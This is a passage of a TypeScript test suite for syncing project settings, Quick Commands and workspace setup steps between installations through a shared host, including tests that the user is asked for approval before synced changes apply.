      await changeOnOther(other, { baseBranch: 'main' });
      await here.sync.syncHost('host');

      await vi.waitFor(() =>
        expect(here.state.projects.get('project-a')?.baseBranch).toBe('main')
      );
    });

    it('doesn’t ask again in the background about what the user declined in the dialog', async () => {
      const { other, here } = await keptInSync();
      const approve = vi.mocked(here.dependencies.approve);
      approve.mockClear().mockResolvedValueOnce('cancel');
      await changeSettingsOnOther(other);

      await here.sync.importFromHost('host', [{ manifestId: MANIFEST_ID, parts: ['settings'] }]);
      here.dependencies.now = () => 1000 + 61_000;
      await here.sync.syncHost('host');
      await new Promise((resolve) => setTimeout(resolve, 0));

      // Only the parts it wasn't asked about yet.
      expect(approve.mock.calls.map(([request]) => request.background)).toEqual([false, true]);
      expect(approve.mock.calls[1][0].changes.map((change) => change.kind)).toEqual([
        'setup-step',
        'action',
        'project-setting',
      ]);
    });

    it('doesn’t ask in the background while the user reviews the same project', async () => {
      const { other, here } = await keptInSync();
      const approve = vi.mocked(here.dependencies.approve);
      let answer: (decision: 'cancel') => void = () => undefined;
      approve.mockClear().mockImplementationOnce(
        () => new Promise((resolve) => (answer = resolve))
      );
      await changeSettingsOnOther(other);

      const copying = here.sync.importFromHost('host', [
        { manifestId: MANIFEST_ID, parts: ['settings'] },
      ]);
      await vi.waitFor(() => expect(approve).toHaveBeenCalledTimes(1));
      here.dependencies.now = () => 1000 + 61_000;
      await here.sync.syncHost('host');
      expect(approve).toHaveBeenCalledTimes(1);

      answer('cancel');
      await copying;
    });

    it('reads only the hosts a project kept in sync came from', async () => {
      const { here } = await keptInSync([], { onHost: false });
      const read = vi.mocked(here.dependencies.host.read);
      read.mockClear();

      here.dependencies.now = () => 1000 + 61_000;
      await here.sync.syncHost('other-host');
      await here.sync.syncHost('host');

      expect(read.mock.calls.map(([hostId]) => hostId)).toEqual(['host']);
    });
  });

  it('keeps offering the parts the user didn’t pick when adding a project', async () => {
    const files = new Map<string, string>();
    const other = installation(files, {
      projects: [project({ icon: ICON, baseBranch: 'develop' })],
    });
    await other.sync.syncHost('host');
    const here = installation(files);

    await here.sync.importFromHost('host', [{ manifestId: MANIFEST_ID, parts: ['appearance'] }]);

    expect(here.state.projects.get('project-new')?.baseBranch).toBeUndefined();
    expect(await here.sync.listOnHost('host')).toMatchObject([
      { projectId: 'project-new', differs: ['settings'] },
    ]);
  });

  it('doesn’t bring back a Quick Command another installation removed', async () => {
    const files = new Map<string, string>();
    const dev: Action = { id: 'dev', title: 'Dev', content: 'npm run dev', projectIds: ['project-a'] };
    const other = installation(files, { projects: [project()], actions: [dev] });
    await other.sync.syncHost('host');
    const here = installation(files, { projects: [project()] });
    await here.sync.importFromHost('host', [
      { manifestId: MANIFEST_ID, parts: ['quickCommands'] },
    ]);

    await changeQuickCommands(other, []);
    // Here, a branch setting starts the command the other installation removed.
    await here.dependencies.projects.update('project-a', {
      aheadTargetAction: 'agent-prompt',
      aheadTargetActionId: 'dev',
    });
    here.dependencies.now = () => 1000 + 11 * 60_000;
    await here.sync.syncHost('host');

    expect(published(files).settings.aheadTargetActionId).toBe('dev');
    expect(published(files).quickCommands).toEqual([]);
  });

  it('keeps a Quick Command the host’s own setup steps start when publishing its removal', async () => {
    const files = new Map<string, string>();
    const build: Action = { id: 'build', title: 'Build', content: 'make', projectIds: ['project-a'] };
    const steps = [
      { id: 'step-1', name: 'Build', command: '', placement: 'tab' as const, actionId: 'build' },
    ];
    const other = installation(files, {
      projects: [project({ setupSteps: steps })],
      actions: [build],
    });
    await other.sync.syncHost('host');
    const here = installation(files, { projects: [project()] });
    await here.sync.importFromHost('host', [
      { manifestId: MANIFEST_ID, parts: ['workspaceSetup', 'quickCommands'] },
    ]);

    // The other installation changes its Workspace Setup; this one removes the step and command.
    await other.dependencies.projects.update('project-a', {
      setupSteps: steps,
      trashCleanupScript: 'docker compose down',
    });
    await other.sync.syncHost('host');
    here.state.actions = [];
    await here.dependencies.projects.update('project-a', { setupSteps: [] });
    here.dependencies.now = () => 1000 + 11 * 60_000;
    await here.sync.syncHost('host');

    expect(published(files).workspaceSetup.setupSteps[0].actionId).toBe('build');
    expect(published(files).quickCommands.map((entry) => entry.id)).toEqual(['build']);
  });

  it('starts afresh for a project removed here and added again', async () => {
    const files = new Map<string, string>();
    const other = installation(files, { projects: [project({ baseBranch: 'develop' })] });
    await other.sync.syncHost('host');
    const here = installation(files, { projects: [project()] });
    await here.sync.importFromHost('host', [{ manifestId: MANIFEST_ID, parts: ['settings'] }]);
    here.state.projects.clear();

    await here.sync.importFromHost('host', [{ manifestId: MANIFEST_ID, parts: ['appearance'] }]);
    here.dependencies.now = () => 1000 + 11 * 60_000;
    await here.sync.syncHost('host');

    expect(published(files).settings.baseBranch).toBe('develop');
  });

  it('still offers Quick Commands removed on the host after copying other parts', async () => {
    const files = new Map<string, string>();
    const dev: Action = { id: 'dev', title: 'Dev', content: 'npm run dev', projectIds: ['project-a'] };
    const other = installation(files, { projects: [project()], actions: [dev] });
    await other.sync.syncHost('host');
    const here = installation(files, { projects: [project()] });
    await here.sync.importFromHost('host', [
      { manifestId: MANIFEST_ID, parts: ['quickCommands'] },
    ]);
    await changeQuickCommands(other, []);
    await changeOnOther(other, { baseBranch: 'develop' });

    await here.sync.importFromHost('host', [{ manifestId: MANIFEST_ID, parts: ['settings'] }]);

    expect(await here.sync.listOnHost('host')).toMatchObject([{ differs: ['quickCommands'] }]);
  });

  it('publishes the Quick Commands its setup steps start along with them', async () => {
    const files = new Map<string, string>();
    const other = installation(files, { projects: [project()] });
    await other.sync.syncHost('host');
    const here = installation(files, { projects: [project()] });
    await here.sync.syncHost('host');

    // Another installation changed the Quick Commands, and this one a step that starts its own.
    await changeQuickCommands(other, [
      { id: 'lint', title: 'Lint', content: 'npm run lint', projectIds: ['project-a'] },
    ]);
    here.state.actions = [{ id: 'dev', title: 'Dev', content: 'npm run dev', type: 'command' }];
    await here.dependencies.projects.update('project-a', {
      setupSteps: [{ id: 'step-1', name: 'Dev', command: '', placement: 'tab', actionId: 'dev' }],
    });
    here.dependencies.now = () => 1000 + 11 * 60_000;
    await here.sync.syncHost('host');

    expect(published(files).quickCommands.map((entry) => entry.id)).toEqual(['lint', 'dev']);
  });
});

async function changeQuickCommands(other: ReturnType<typeof installation>, actions: Action[]) {
  other.state.actions = actions;
  await other.sync.syncHost('host');
}

/** Another installation changes its project, and its Quick Commands if given, and publishes. */
async function changeOnOther(
  other: ReturnType<typeof installation>,
  updates: Partial<Project>,
  actions?: Action[]
) {
  await other.dependencies.projects.update('project-a', updates);
  if (actions) other.state.actions = actions;
  await other.sync.syncHost('host');
}
